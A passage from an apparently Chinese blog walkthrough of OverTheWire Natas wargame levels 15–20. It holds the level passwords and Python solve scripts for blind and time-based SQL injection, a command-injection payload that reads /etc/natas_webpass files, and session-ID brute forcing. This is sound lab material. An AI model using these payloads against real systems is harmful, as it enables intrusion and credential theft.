class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    </span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and substr((SELECT password FROM users WHERE `username`= &quot;natas16&quot;),&#x27;</span>+<span class="built_in">str</span>(t+<span class="number">1</span>)+<span class="string">&#x27;,1)= BINARY &quot;&#x27;</span> + i + <span class="string">&#x27;&quot; #&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = requests.post(url, data=data, headers=headers)</span><br><span class="line">        ans = re.findall(<span class="string">&#x27;(.*)&lt;br&gt;&#x27;</span>, result.text)</span><br><span class="line">        tip = re.findall(<span class="string">&#x27;&lt;br&gt;(.*)&lt;br&gt;&#x27;</span>, result.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(ans[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> (tip == <span class="string">&quot;This user exists.&quot;</span>):</span><br><span class="line">            password += i</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://www.freebuf.com/column/182518.html">https://www.freebuf.com/column/182518.html</a></p>
</blockquote>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">For security reasons, we now filter even more on certain characters<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    if(preg_match(&#x27;/[;|&amp;`\&#x27;&quot;]/&#x27;,$key)) &#123;</span><br><span class="line">        print &quot;Input contains an illegal character!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        passthru(&quot;grep -i \&quot;$key\&quot; dictionary.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样是命令执行，不过这一次过滤的更多，而且将传入的 $key 置于一对双引号之间</p>
<p>但是没有过滤 <code>$ ( )</code> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/10 10:09</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas16.natas.labs.overthewire.org/index.php?needle=&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==&quot;</span>, &#125;</span><br><span class="line">words = []</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">        <span class="comment"># 爆破出密码：利用$()内部执行grep ^加爆破的数据，后面拼接dictionary.txt中存在的单词，进行逐位爆破</span></span><br><span class="line">        <span class="comment"># 当爆破位正确时应当返回空，错误时返回拼接的那个单词</span></span><br><span class="line">        query = <span class="string">&quot;$(grep ^&quot;</span> + password + i + <span class="string">&quot; /etc/natas_webpass/natas17)African&quot;</span></span><br><span class="line">        re = requests.get(url=url + query, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(re.text) != <span class="number">1122</span>:</span><br><span class="line">            password += i</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200210110001888.png" alt="image-20200210110001888"></p>
<h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</span><br></pre></td></tr></table></figure>

<p>查看源码:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas17<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas17&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas17&#x27;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        //echo &quot;This user exists.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;This user doesn&#x27;t exist.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;Error in query.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Check existence&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>基于时间的盲注</p>
<p>Python脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/10 11:06</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas17.natas.labs.overthewire.org/index.php?debug=1&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==&quot;</span>, &#125;</span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas18&quot; and if(substr((SELECT password FROM users WHERE `username`= &quot;natas18&quot;),&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    t + <span class="number">1</span>) + <span class="string">&#x27;,1)= BINARY &quot;&#x27;</span> + i + <span class="string">&#x27;&quot;,0,sleep(3)) #&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            stime = time.time()</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">                <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            etime = time.time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (etime - stime &lt; <span class="number">3</span>):</span><br><span class="line">                password += i</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;进度:&quot;</span>, (t + <span class="number">1</span>), <span class="string">&quot;/32&quot;</span>, <span class="string">&quot;本次请求用时:&quot;</span>, etime - stime, <span class="string">&#x27;字符:&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200210143041922.png" alt="image-20200210143041922"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$maxid</span> = <span class="number">640</span>; <span class="comment">// 640 should be enough for everyone</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidAdminLogin</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">/* This method of authentication appears to be unsafe and has been disabled for now. */</span></span><br><span class="line">        <span class="comment">//return 1;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidID</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createID</span>(<span class="params"><span class="variable">$user</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$maxid</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="variable">$maxid</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;DEBUG: <span class="subst">$msg</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_session_start</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">and</span> <span class="title function_ invoke__">isValidID</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">session_start</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start ok&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session was old: admin flag set&quot;</span>);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="number">0</span>; <span class="comment">// backwards compatible, secure</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_credentials</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas19\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$showform</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">my_session_start</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;password&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">createID</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>]));</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="title function_ invoke__">isValidAdminLogin</span>();</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;New session started&quot;</span>);</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$showform</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>服务端通过验证 PHPSESSID 来确认身份，范围在640以内，爆破即可：</p>
<p>利用Burp：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211095953166.png" alt="image-20200211095953166"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211100025482.png" alt="image-20200211100025482"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211100447711.png" alt="image-20200211100447711"></p>
<h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102211284.png" alt="image-20200211102211284"></p>
<p>抓包查看PHPSESSID：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102237920.png" alt="image-20200211102237920"></p>
<p>多次请求，发现返回的PHPSESSID后一部分都相同</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102326468.png" alt="image-20200211102326468"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102335129.png" alt="image-20200211102335129"></p>
<p>这一串字符像十六进制编码，转字符串后得到：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102424647.png" alt="image-20200211102424647"></p>
<p>应该是 id-username </p>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/11 10:31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoRun</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            encodeID = self._queue.get()</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;PHPSESSID=&quot;</span> + encodeID</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res.text) != <span class="number">1050</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas19.natas.labs.overthewire.org/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">50</span></span><br><span class="line">    Queue = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">641</span>):</span><br><span class="line">        code = <span class="built_in">str</span>(<span class="built_in">id</span>) + <span class="string">&quot;-admin&quot;</span></span><br><span class="line">        encodeID = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> code])</span><br><span class="line">        Queue.put(encodeID)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        threads.append(DoRun(Queue))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211114208651.png" alt="image-20200211114208651"></p>
<p>查看源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myread</span>(<span class="params"><span class="variable">$sid</span></span>) </span>&#123; </span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;MYREAD <span class="subst">$sid</span>&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strspn</span>(<span class="variable">$sid</span>, <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$sid</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Invalid SID&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">session_save_path</span>() . <span class="string">&quot;/&quot;</span> . <span class="string">&quot;mysess_&quot;</span> . <span class="variable">$sid</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session file doesn&#x27;t exist&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Reading from &quot;</span>. <span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span 